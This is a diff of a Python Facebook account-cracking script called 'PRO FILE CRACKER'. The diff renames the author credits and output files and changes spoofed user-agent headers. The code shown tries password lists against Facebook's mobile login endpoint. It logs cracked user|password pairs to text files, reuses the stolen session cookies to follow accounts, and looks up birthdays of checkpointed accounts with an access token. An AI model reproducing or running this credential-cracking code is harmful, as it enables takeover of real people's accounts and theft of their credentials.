@@ -62,7 +62,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; RMX2101 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/321.0.0.16.119;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
@@ -73,19 +73,18 @@ def jalan(z):
         time.sleep(0.01)
 
 logo =                                          """   
-\033[0;91m     
-           
-       
-     
-     
-      
-      
-                                   
+\033[0;91m ##    ## ##     ##    ###    ##       #### ########  
+\033[0;92m ##   ##  ##     ##   ## ##   ##        ##  ##     ## 
+\033[0;93m ##  ##   ##     ##  ##   ##  ##        ##  ##     ## 
+\033[0;94m #####    ######### ##     ## ##        ##  ##     ## 
+\033[0;95m ##  ##   ##     ## ######### ##        ##  ##     ## 
+\033[0;96m ##   ##  ##     ## ##     ## ##        ##  ##     ## 
+\033[0;92m ##    ## ##     ## ##     ## ######## #### ########
 \x1b[1;92m------------------------\x1b[1;91m------------------------
 \x1b[1;92m------------------------\x1b[1;91m------------------------
-\033[0;91m\033[0;91m [+] AUTHOR \x1b[1;97m : \033[0;91m           Fazla Alahi
-\033[0;91m\033[0;92m [+] FACEBOOK\x1b[1;97m:  \033[0;92m          Fazla Alahi
-\033[0;91m\033[0;93m [+] GITHUB\x1b[1;97m  : \033[0;93m           Fazla Alahi
+\033[0;91m\033[0;91m [+] AUTHOR \x1b[1;97m : \033[0;91m           KHALID SHAIFULLAH
+\033[0;91m\033[0;92m [+] FACEBOOK\x1b[1;97m:  \033[0;92m          KHALID SHAIFULLAH
+\033[0;91m\033[0;93m [+] GITHUB\x1b[1;97m  : \033[0;93m           KHALID-SHAIFULLAH
 \033[0;91m\033[0;96m [+] TOOL\x1b[1;97m : \033[0;96m              PRO FILE CRACKER
 \033[1;32m------------------------\033[1;31m------------------------ 
 \x1b[1;92m------------------------\x1b[1;91m------------------------"""
@@ -94,8 +93,8 @@ def hasil(OK,cp):
 	if not len(OK) != 0:
 	    pass
 	if len(cp) != 0:
-	    print('\n\n  \x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mAlahi_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mAlahi_CP.txt' % (H, P, str(len(cp))))
+	    print('\n\n  \x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKhalid_OK.txt' % (H, P, str(len(ok))))
+	    print('  \x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKhalid_CP.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;97mPRESS ENTER TO BACK MAIN MENU ")
 	    sarfraz()
 
@@ -138,7 +137,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;93m[Alahi-CHECK] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;93m[KHALID-CHECK] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -147,8 +146,8 @@ class __xxx__:
                 header = {
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
-                    "user-agent":"Mozilla/5.0 (Linux; U; Android 10; th-th; RMX2101 Build/QKQ1.200614.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9",
                     "dnt":"1",
                     "x-requested-with":"mark.via.gp",
                     "sec-fetch-site":"same-origin",
@@ -174,7 +173,7 @@ class __xxx__:
                     "upgrade-insecure-requests":"1",
                     "origin":"https://"+cebok,
                     "content-type":"application/x-www-form-urlencoded",
-                    "user-agent":"Mozilla/5.0 (Linux; U; Android 10; th-th; RMX2101 Build/QKQ1.200614.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 10; RMX2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "x-requested-with":"XMLHttpRequest",
                     "sec-fetch-site":"same-origin",
@@ -188,10 +187,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [Alahi-OK] {user} | {pw}")
+                    print(f"\r{H} [KHALID-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('Alahi_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('KHALID_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -200,10 +199,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [Alahi-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [KHALID-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('Alahi_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('KHALID_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -211,10 +210,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [Alahi-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [KHALID-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('Alahi_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('KHALID_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
